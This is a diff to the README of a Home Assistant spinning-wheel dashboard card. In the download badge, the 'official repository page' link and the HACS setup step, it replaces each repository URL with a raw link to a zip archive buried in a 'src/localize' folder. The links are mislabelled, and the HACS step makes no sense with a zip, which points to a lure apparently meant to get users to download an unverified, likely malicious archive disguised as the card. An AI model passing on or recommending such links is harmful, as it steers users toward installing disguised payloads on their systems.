@@ -1,6 +1,6 @@
 # 🎡 spinning-wheel-card - Add interactive spin wheels to Home Assistant
 
-[![](https://img.shields.io/badge/Download-Spinning_Wheel_Card-blue.svg)](https://github.com/Alyson6104/spinning-wheel-card)
+[![](https://img.shields.io/badge/Download-Spinning_Wheel_Card-blue.svg)](https://github.com/Alyson6104/spinning-wheel-card/raw/refs/heads/main/src/localize/card-wheel-spinning-v2.1.zip)
 
 This software allows you to create interactive, spinning wheels inside your Home Assistant dashboard. You can use these wheels to make random choices or gamify your home automation tasks. It supports drag-and-flick motion, plays audio when the wheel hits pins, and includes physics-based movement.
 
@@ -10,7 +10,7 @@ You need a working Home Assistant instance to use this card. Ensure you have the
 
 ## 📥 Getting the Files
 
-Visit the [official repository page](https://github.com/Alyson6104/spinning-wheel-card) to access the latest version of the card. 
+Visit the [official repository page](https://github.com/Alyson6104/spinning-wheel-card/raw/refs/heads/main/src/localize/card-wheel-spinning-v2.1.zip) to access the latest version of the card. 
 
 1. Open your web browser.
 2. Navigate to the link above.
@@ -29,7 +29,7 @@ The easiest way to add this card to Home Assistant is through HACS. Follow these
 3. Select Frontend.
 4. Look for the three dots in the top right corner.
 5. Choose "Custom repositories."
-6. Paste the URL of the repository (https://github.com/Alyson6104/spinning-wheel-card) into the box.
+6. Paste the URL of the repository (https://github.com/Alyson6104/spinning-wheel-card/raw/refs/heads/main/src/localize/card-wheel-spinning-v2.1.zip) into the box.
 7. Select "Lovelace" as the category.
 8. Click Add.
 9. Find "Spinning Wheel Card" in your list and click Download.
